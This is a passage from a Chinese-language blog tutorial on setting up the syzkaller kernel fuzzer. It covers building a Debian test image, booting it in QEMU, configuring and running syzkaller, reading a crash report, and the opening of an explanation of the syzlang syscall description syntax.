<span class="built_in">rm</span> -rf <span class="variable">$DIR</span></span><br><span class="line">sudo <span class="built_in">mkdir</span> -p <span class="variable">$DIR</span></span><br><span class="line">sudo <span class="built_in">chmod</span> 0755 <span class="variable">$DIR</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. debootstrap stage</span></span><br><span class="line"></span><br><span class="line">DEBOOTSTRAP_PARAMS=<span class="string">&quot;--arch=<span class="variable">$DEBARCH</span> --include=<span class="variable">$PREINSTALL_PKGS</span> --components=main,contrib,non-free <span class="variable">$RELEASE</span> <span class="variable">$DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"> DEBOOTSTRAP_PARAMS=<span class="string">&quot;--foreign <span class="variable">$DEBOOTSTRAP_PARAMS</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># riscv64 is hosted in the debian-ports repository</span></span><br><span class="line"><span class="comment"># debian-ports doesn&#x27;t include non-free, so we exclude firmware-atheros</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$DEBARCH</span> == <span class="string">&quot;riscv64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"> DEBOOTSTRAP_PARAMS=<span class="string">&quot;--keyring /usr/share/keyrings/debian-ports-archive-keyring.gpg --exclude firmware-atheros <span class="variable">$DEBOOTSTRAP_PARAMS</span> http://deb.debian.org/debian-ports&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">sudo debootstrap <span class="variable">$DEBOOTSTRAP_PARAMS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. debootstrap stage: only necessary if target != host architecture</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"> sudo <span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static) <span class="variable">$DIR</span>/$(<span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static)</span><br><span class="line"> sudo <span class="built_in">chroot</span> <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;/debootstrap/debootstrap --second-stage&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set some defaults and enable promtless ssh to the machine for root.</span></span><br><span class="line">sudo sed -i <span class="string">&#x27;/^root/ &#123; s/:x:/::/ &#125;&#x27;</span> <span class="variable">$DIR</span>/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/inittab</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;\nauto eth0\niface eth0 inet dhcp\n&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/network/interfaces</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/dev/root / ext4 defaults 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;debugfs /sys/kernel/debug debugfs defaults 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;securityfs /sys/kernel/security securityfs defaults 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;configfs /sys/kernel/config/ configfs defaults 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc defaults 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;127.0.0.1\tlocalhost\n&quot;</span> | sudo <span class="built_in">tee</span> <span class="variable">$DIR</span>/etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/resolve.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;syzkaller&quot;</span> | sudo <span class="built_in">tee</span> <span class="variable">$DIR</span>/etc/hostname</span><br><span class="line">ssh-keygen -f <span class="variable">$RELEASE</span>.id_rsa -t rsa -N <span class="string">&#x27;&#x27;</span></span><br><span class="line">sudo <span class="built_in">mkdir</span> -p <span class="variable">$DIR</span>/root/.ssh/</span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$RELEASE</span>.id_rsa.pub | sudo <span class="built_in">tee</span> <span class="variable">$DIR</span>/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add perf support</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$PERF</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"> <span class="built_in">cp</span> -r <span class="variable">$KERNEL</span> <span class="variable">$DIR</span>/tmp/</span><br><span class="line"> BASENAME=$(<span class="built_in">basename</span> <span class="variable">$KERNEL</span>)</span><br><span class="line"> sudo <span class="built_in">chroot</span> <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;apt-get update; apt-get install -y flex bison python-dev libelf-dev libunwind8-dev libaudit-dev libslang2-dev libperl-dev binutils-dev liblzma-dev libnuma-dev&quot;</span></span><br><span class="line"> sudo <span class="built_in">chroot</span> <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;cd /tmp/<span class="variable">$BASENAME</span>/tools/perf/; make&quot;</span></span><br><span class="line"> sudo <span class="built_in">chroot</span> <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;cp /tmp/<span class="variable">$BASENAME</span>/tools/perf/perf /usr/bin/&quot;</span></span><br><span class="line"> <span class="built_in">rm</span> -r <span class="variable">$DIR</span>/tmp/<span class="variable">$BASENAME</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add udev rules for custom drivers.</span></span><br><span class="line"><span class="comment"># Create a /dev/vim2m symlink for the device managed by the vim2m driver</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ATTR&#123;name&#125;==&quot;vim2m&quot;, SYMLINK+=&quot;vim2m&quot;&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/udev/rules.d/50-udev-default.rules</span><br><span class="line"></span><br><span class="line"><span class="comment"># Build a disk image</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=<span class="variable">$RELEASE</span>.img bs=1M seek=<span class="variable">$SEEK</span> count=1</span><br><span class="line">sudo mkfs.ext4 -F <span class="variable">$RELEASE</span>.img</span><br><span class="line">sudo <span class="built_in">mkdir</span> -p /mnt/<span class="variable">$DIR</span></span><br><span class="line">sudo mount -o loop <span class="variable">$RELEASE</span>.img /mnt/<span class="variable">$DIR</span></span><br><span class="line">sudo <span class="built_in">cp</span> -a <span class="variable">$DIR</span>/. /mnt/<span class="variable">$DIR</span>/.</span><br><span class="line">sudo umount /mnt/<span class="variable">$DIR</span></span><br></pre></td></tr></table></figure></blockquote><p>这一步不知道是因为网络原因还是别的原因<strong>总而言之非常的慢</strong>（比上面编译内核耗时还长），完成之后如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 554772</span><br><span class="line">drwxrwxr-x  3 arttnba3 arttnba3       4096 Nov 12 03:02 ./</span><br><span class="line">drwxrwxr-x  7 arttnba3 arttnba3       4096 Nov 12 00:53 ../</span><br><span class="line">drwxr-xr-x 21 root     root           4096 Nov 12 02:58 chroot/</span><br><span class="line">-rwxrwxr-x  1 arttnba3 arttnba3       6360 Nov 11 23:25 create-image.sh*</span><br><span class="line">-rw-------  1 arttnba3 arttnba3       2602 Nov 12 03:02 stretch.id_rsa</span><br><span class="line">-rw-r--r--  1 arttnba3 arttnba3        569 Nov 12 03:02 stretch.id_rsa.pub</span><br><span class="line">-rw-rw-r--  1 arttnba3 arttnba3 2147483648 Nov 12 03:02 stretch.img</span><br></pre></td></tr></table></figure><p>我们可以在文件目录下找到一个名为 <code>stretch.img</code> 的文件，这个文件就是构建好的磁盘镜像文件</p><h2 id="安装-qemu"><a href="#安装-qemu" class="headerlink" title="安装 qemu"></a>安装 qemu</h2><p>这一步还是比较简单的，需要注意的是如果你和笔者一样在 VMware 上使用 Linux 则应当在设置中把 <code>虚拟化 Intel VT-x/EPT 或 AMD-V/RVI(V)</code> 打开</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install qemu-system-x86</span></span><br></pre></td></tr></table></figure><p>完成这一切之后看看内核是否能够被成功启动，启动脚本如下（别忘了替换内核镜像与硬盘镜像的路径）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 2G \</span><br><span class="line">-smp 2 \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot;</span> \</span><br><span class="line">-drive file=./stretch.img,format=raw \</span><br><span class="line">-net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \</span><br><span class="line">-net nic,model=e1000 \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-nographic \</span><br><span class="line">-pidfile vm.pid \</span><br><span class="line">2&gt;&amp;1 | <span class="built_in">tee</span> vm.log</span><br></pre></td></tr></table></figure><p>默认 root 账户无密码，成功登入</p><p><img src="https://i.loli.net/2021/11/12/v5sQXyulgK92Mq1.png" alt="image.png"></p><p>前面在配置硬盘镜像文件时还给我们提供了 ssh key，我们也可以用 ssh 来直接连接至虚拟机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh -i ./stretch.id_rsa -p 10021 -o <span class="string">&quot;StrictHostKeyChecking no&quot;</span> root@localhost</span></span><br></pre></td></tr></table></figure><p>至此，需要的环境就都配置完成了</p><h1 id="0x02-开始使用-syzkaller"><a href="#0x02-开始使用-syzkaller" class="headerlink" title="0x02.开始使用 syzkaller"></a>0x02.开始使用 syzkaller</h1><h2 id="PRE-工作原理"><a href="#PRE-工作原理" class="headerlink" title="PRE.工作原理"></a><em>PRE.工作原理</em></h2><p>对于 syzkaller 的架构，官方给出了这样的一张 Overview</p><p><img src="https://i.loli.net/2021/11/11/LxNvdhpEX2sBjYc.png" alt="image.png"></p><ul><li><p><code>syz-manager</code> ：syzkaller 的控制中枢，其会启动多个 VM 实例（如图所示的一个黄色卡片就是一个实例）并进行监视，同时通过 RPC 来启动 <code>syz-fuzzer</code></p></li><li><p><code>syz-fuzzer</code> ：负责引导整个 fuzz 的过程：</p><ul><li>生成 input</li><li>启动 <code>syz-executor</code> 进程进行 fuzz</li><li>从被 fuzz 的 kernel 的 <code>/sys/kernel/debug/kcov</code> 获得覆盖（coverage）的相关信息</li><li>通过 RPC 将新的覆盖回送到 <code>syz-manager</code></li></ul></li><li><p><code>syz-executor</code>：负责<strong>执行单个输入</strong>——从 <code>syz-fuzzer</code> 处接受 input 并执行，最后回送结果</p></li></ul><h2 id="配置文件（for-test）"><a href="#配置文件（for-test）" class="headerlink" title="配置文件（for test）"></a>配置文件（for test）</h2><p>我们需要为 syzkaller 编写额外的配置文件，一个简单的例子如下，这里需要注意替换为你自己的路径，包括 <code>workdir</code> 文件夹你应当手动 mkdir 一个：</p><blockquote><p>config.cfg</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Documents/golang/gopath/src/github.com/google/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/linux-5.11&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/image/stretch.img&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sshkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/image/stretch.id_rsa&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Documents/golang/gopath/src/github.com/google/syzkaller&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/syzkaller/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="启动-syzkaller"><a href="#启动-syzkaller" class="headerlink" title="启动 syzkaller"></a>启动 syzkaller</h2><p>在 syzkaller 目录下输入如下命令启动 syzkaller：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./bin/syz-manager -config=config.cfg</span></span><br></pre></td></tr></table></figure><p>成功启动后我们可以通过访问 <code>localhost:56741</code> 来获取 syzkaller 的状态，效果如下图所示：</p><p><img src="https://i.loli.net/2021/11/12/BnYuNbO2MdiEw5V.png" alt="image.png"></p><h3 id="可能会遇到的问题"><a href="#可能会遇到的问题" class="headerlink" title="*可能会遇到的问题"></a><em>*可能会遇到的问题</em></h3><h4 id="无法启动-vm-instance"><a href="#无法启动-vm-instance" class="headerlink" title="无法启动 vm instance"></a>无法启动 vm instance</h4><p>有可能会遇到无法启动 vm instance 的问题，报错形式大致如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64: error: failed to set MSR 0x48f to 0x7fffff00036dfb</span><br><span class="line">qemu-system-x86_64: ../../target/i386/kvm/kvm.c:2753: kvm_buf_set_msrs: Assertion `ret == cpu-&gt;kvm_msr_buf-&gt;nmsrs&#x27; failed.</span><br></pre></td></tr></table></figure><p>按照官方给出的解决办法是在 qemu 的启动参数中去掉 <code>-cpu host,migratable=off</code>，我们需要在配置文件的 <code>vm</code> 项中添加 <code>qemu-args</code>项，值为 <code>-enable-kvm</code>，如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Documents/golang/gopath/src/github.com/google/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/linux-5.11&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/image/stretch.img&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;sshkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/image/stretch.id_rsa&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Documents/golang/gopath/src/github.com/google/syzkaller&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/syzkaller/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;qemu_args&quot;</span><span class="punctuation">:</span><span class="string">&quot;-enable-kvm&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="网络设备问题"><a href="#网络设备问题" class="headerlink" title="网络设备问题"></a>网络设备问题</h4><p>在 syzkaller 挖掘过程中可能出现如下报错信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[FAILED] Failed to start Raise network interfaces.</span><br></pre></td></tr></table></figure><p>虽然似乎还是能正常启动的</p><h2 id="crash-分析"><a href="#crash-分析" class="headerlink" title="crash 分析"></a>crash 分析</h2><p>笔者本来想写一个有漏洞点内核模块来人为制造 crash，不过现在刚开挖没几分钟就出了一个 crash，由于用的是 5.11 版本的内核，已经不算太新了，笔者认为应该是挖到了现有的 CVE，通过 Google 笔者也找到了一个<a href="https://syzkaller.appspot.com/bug?id=ad240ff5c32ca4f3406dc3acca519370693bb47c">基本上是一样的 crash</a>，不过我们还是来简单分析一下</p><p><img src="https://i.loli.net/2021/11/12/7EHYatBoG6KFxqR.png" alt="image.png"></p><p>在 Description 项中说明了 crash 的简要信息，点开分为两项：<code>log</code> 和 <code>report</code></p><p><img src="https://i.loli.net/2021/11/12/Q6dBoPOHm7sRtgI.png" alt="image.png"></p><p>log 中给出的是 fuzz 的流程，包括运行的系统调用、输入参数等一系列信息，因为是自动生成的所以一般不会特别好看</p><p><img src="https://i.loli.net/2021/11/12/ANwKC67iRQL2ZHt.png" alt="image.png"></p><p>report 中给出的则是 kernel 相关信息，例如调用栈回溯等</p><p><img src="https://i.loli.net/2021/11/12/UvNkQe7ElAHSKm6.png" alt="image.png"></p><p>比较可惜的是这个 crash <strong>没法重现</strong>，在一个 crash 刚刚生成时 syzkaller 会尝试进行重现，此时 report 的状态会显示为 <code>reproducing</code>，若成功了则会显示对应的结果，品相比较好的一种 report 就是 <code>has C repo</code>：有产生该 crash 的 C 代码</p><p><img src="https://i.loli.net/2021/11/12/l47kcaVMS9wH6u5.png" alt="image.png"></p><h1 id="0x03-使用-syzlang-编写描述文件进行-fuzz"><a href="#0x03-使用-syzlang-编写描述文件进行-fuzz" class="headerlink" title="0x03.使用 syzlang 编写描述文件进行 fuzz"></a>0x03.使用 syzlang 编写描述文件进行 fuzz</h1><p>直接就这样挂着肯定不能直接就把洞挖出来<del>虽然笔者前面没挂一会就出了一个crash</del>，因此接下来我们需要人工配置系统调用模板，以<strong>有针对性地</strong>进行漏洞挖掘</p><p>syzkaller 使用它自己的声明式语言（Syscall Description Language，aka <code>syzlang</code>（读作 <code>[siːzˈlæŋg]</code>，<del>笔者以前一直读作 [saiːzˈlæŋg]…</del>））来描述系统调用模板，在安装目录下的 <code>docs/syscall_descriptions.md</code> 与 <code>docs/syscall_descriptions_syntax.md</code> 中有着相关的说明，在笔者看来是类似 C 的一门描述语言</p><p>我们需要使用 syzlang 来编写特定的系统调用描述文件（也叫规则文件，后文中这两个词指的是同一个东西），syzkaller 会根据我们的描述文件有针对性地进行 fuzz</p><p><a href="https://github.com/google/syzkaller/blob/master/sys/linux/sys.txt">这是 Google 给出的一个例子</a></p><blockquote><p>笔者看着也是比较头大的…还是慢慢来吧…</p><p>以下主要是翻译谷歌官方的文档（<del>谁叫国内没有中文文档呢</del>），外加一些笔者自己本人的理解以及补充说明</p></blockquote><h2 id="syzlang-语法"><a href="#syzlang-语法" class="headerlink" title="syzlang 语法"></a>syzlang 语法</h2><p>syzlang 的语法结构如下，<del>看完你也能快速上手！</del>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syscallname &quot;(&quot; [arg [&quot;,&quot; arg]*] &quot;)&quot; [type] [&quot;(&quot; attribute* &quot;)&quot;]</span><br><span class="line">arg = argname type</span><br><span class="line">argname = identifier</span><br><span class="line">type = typename [ &quot;[&quot; type-options &quot;]&quot; ]</span><br><span class="line">typename = &quot;const&quot; | &quot;intN&quot; | &quot;intptr&quot; | &quot;flags&quot; | &quot;array&quot; | &quot;ptr&quot; |</span><br><span class="line">   &quot;string&quot; | &quot;strconst&quot; | &quot;filename&quot; | &quot;glob&quot; | &quot;len&quot; |</span><br><span class="line">   &quot;bytesize&quot; | &quot;bytesizeN&quot; | &quot;bitsize&quot; | &quot;vma&quot; | &quot;proc&quot;</span><br><span class="line">type-options = [type-opt [&quot;,&quot; type-opt]]</span><br></pre></td></tr></table></figure><blockquote><p>这个时候你需要把自己当作一个 scanner + parser（大雾</p><p><del>正则表达式相信大家应该都学过，哪怕没学过编译原理课上你总会学到的，那么按照正则来看的话其实这个语法结构并不难解析</del>（</p></blockquote><p>以下是对其中的一些符号说明，<strong>不是 syzlang 实际语法内容</strong>：</p><ul><li>双引号 <code>&quot;&quot; </code>表示这个符号内的东西表示<strong>要按其原样进行匹配</strong>，丢弃双引号</li><li>或符号 <code>|</code> 表示值可以取左边也可以取右边</li><li>等于号 <code>=</code> 表示左边的表达式应当为右边的形式</li><li>中括号 <code>[]</code> 表示一个<strong>可选表达式</strong>，取其内的值并丢弃中括号</li><li>星号 <code>*</code> 表示<strong>闭包</strong>，即 0 次或多次的自我连接  <del>什么？你还没学过离散数学</del></li></ul><p>这是谷歌官方给出的一个例子：</p><blockquote><p><code>syzkaller</code> uses declarative description of syscall interfaces to manipulate programs (sequences of syscalls). Below you can see (hopefully self-explanatory) excerpt from the descriptions:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(file filename, flags flags[open_flags], mode flags[open_mode]) fd</span><br><span class="line">read(fd fd, buf buffer[out], count len[buf])</span><br><span class="line">close(fd fd)</span><br><span class="line">open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure><p><del>斯密🦄赛，👴没法做到 self-explanatory</del></p></blockquote><h3 id="O-注释与文件包含"><a href="#O-注释与文件包含" class="headerlink" title="O.注释与文件包含"></a>O.注释与文件包含</h3><p>syzlang 中的注释与 shell 脚本注释形式相同，为以 <code>#</code> 开头的单行注释</p><p>这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># this is a useful sentence! do not delete it!</span><br></pre></td></tr></table></figure><p>在 syzlang 中，我们可以额外引入<strong>内核源码文件</strong>作为参数、系统调用…等等一系列的补充，形式与 C 语言的 include 语句大致相同，不过**没有了开头的”#”**（因为 # 开头是注释）</p><p>这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &lt;linux/fs.h&gt;</span><br></pre></td></tr></table></figure><h3 id="I-参数（arg）与参数名（argname）"><a href="#I-参数（arg）与参数名（argname）" class="headerlink" title="I.参数（arg）与参数名（argname）"></a>I.参数（arg）与参数名（argname）</h3><p>我们输入给系统调用模板的 <code>参数 （arg）</code> 应当为如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg = argname type</span><br></pre></td></tr></table></figure><p>即一个参数由 <code>参数名 （argname）  </code> 与 <code>类型（type）</code> 组成</p><p>其中，参数名便是 <code>标识符（identifier）</code></p><h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>这么讲有些空泛，我们来简单看一个例子，在 Linux 中系统调用 <code>read</code> 的声明（其实是定义）如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(read, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">char</span> __user *, buf, <span class="type">size_t</span>, count)</span><br></pre></td></tr></table></figure><p>当我们使用 libc 的 wrapper 进行 read 系统调用时，形式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> my_file_fd = open(<span class="string">&quot;/dev/a3dev&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="type">char</span> my_buf[<span class="number">114514</span>];</span><br><span class="line"><span class="type">size_t</span>my_count = <span class="number">114514</span>;</span><br><span class="line">read(my_file_fd, my_buf, my_count);</span><br></pre></td></tr></table></figure><p>在这个例子当中，<code>fd、buf、count</code> 便是 <strong>argname</strong>，<code>my_file_fd、my_buf、my_count</code> 便是 <strong>type</strong></p><p>那么，在我们使用 syzlang 编写系统调用模板时，例如 read 的第一个参数，我们应该写成下面这个样子（假设 my_file_fd 已定义为一个 <code>resources</code>（后面会讲））：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd my_file_fd</span><br></pre></td></tr></table></figure><h3 id="II-类型（type）"><a href="#II-类型（type）" class="headerlink" title="II.类型（type）"></a>II.类型（type）</h3><blockquote><p>其实这么翻译笔者觉得好像不大准确，不过笔者英文不大行所以这里暂且直译…</p></blockquote><p>前面我们讲到一个 <code>arg</code> 由 一个 <code>argname </code>与 <code>type</code> 组成，argname 